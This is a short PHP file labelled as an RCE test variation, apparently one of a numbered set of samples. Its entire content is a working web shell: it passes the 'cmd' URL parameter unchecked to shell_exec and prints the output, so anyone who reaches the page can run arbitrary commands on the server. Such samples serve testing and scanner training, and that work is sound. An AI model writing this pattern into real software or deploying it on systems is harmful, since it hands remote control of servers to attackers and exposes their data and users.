<?php
// RCE test variation #730
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>